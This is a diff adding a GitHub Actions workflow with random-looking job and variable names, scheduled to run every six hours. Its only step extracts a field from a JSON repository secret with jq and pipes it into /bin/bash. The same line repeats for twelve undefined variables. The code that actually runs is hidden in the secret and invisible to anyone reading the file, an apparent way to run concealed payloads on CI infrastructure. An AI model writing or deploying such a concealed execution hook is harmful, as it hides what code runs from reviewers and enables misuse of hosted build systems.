@@ -1,0 +1,30 @@
+name: tengyuxi3412
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tengyuxi3412
+        env:
+          wmjk798: ${{ secrets.wmjk798 }}
+        run: |
+          echo $wmjk798 | jq -r .u023 | /bin/bash
+          echo $ko52 | jq -r .wxny0 | /bin/bash
+          echo $vhrho730 | jq -r .rj9618 | /bin/bash
+          echo $rhx58 | jq -r .pw78 | /bin/bash
+          echo $ehgu70990 | jq -r .pg68824 | /bin/bash
+          echo $ejor35290 | jq -r .iuvn6839 | /bin/bash
+          echo $cc513 | jq -r .h7025 | /bin/bash
+          echo $g60633 | jq -r .m7471 | /bin/bash
+          echo $lvyr59341 | jq -r .oh960 | /bin/bash
+          echo $rd57987 | jq -r .way277 | /bin/bash
+          echo $v81 | jq -r .pf04327 | /bin/bash
+          echo $bl2723 | jq -r .rmhn707 | /bin/bash
+          echo $lh49 | jq -r .akjwt4400 | /bin/bash
+
